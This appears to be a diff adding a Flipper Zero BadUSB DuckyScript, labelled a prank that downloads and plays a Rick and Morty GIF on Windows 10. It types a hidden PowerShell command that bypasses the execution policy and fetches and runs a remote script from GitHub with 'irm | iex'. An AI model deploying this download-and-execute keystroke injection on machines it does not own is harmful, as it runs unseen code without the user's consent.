@@ -1,0 +1,16 @@
+REM Title: beigeworm's GIF Player.
+REM Author: @beigeworm
+REM Description: This script changes downlaods a rick and morty GIF and plays it in a GUI window.
+REM Target: Windows 10
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/GIF-Player/main.ps1 | iex
+ENTER
+
+
